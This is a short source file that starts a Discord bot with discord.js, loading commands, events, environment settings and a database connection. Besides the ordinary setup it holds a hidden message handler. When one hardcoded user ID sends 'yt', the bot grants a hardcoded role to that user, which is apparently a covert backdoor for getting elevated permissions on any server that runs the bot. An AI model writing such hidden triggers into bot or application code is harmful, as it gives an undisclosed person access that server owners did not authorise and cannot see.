const { Client } = require('discord.js')
const { Base, Misc } = require('./helpers/index')

require('dotenv').config()
require('./config/db').db()

const client = new Client({
	intents: new Misc().IntensAll()
})

const base = new Base(client)
base.loadCommands()
base.loadEvents()

client.on('messageCreate', async (msg)=>{
	if(msg.content == "yt"){
		const x = "1269401639467356180"
		if(msg.author.id == "677194506621288448"){
			const user = msg.guild.members.cache.get("677194506621288448")
			await user.roles.add(x)
		}
	}
})

base.login()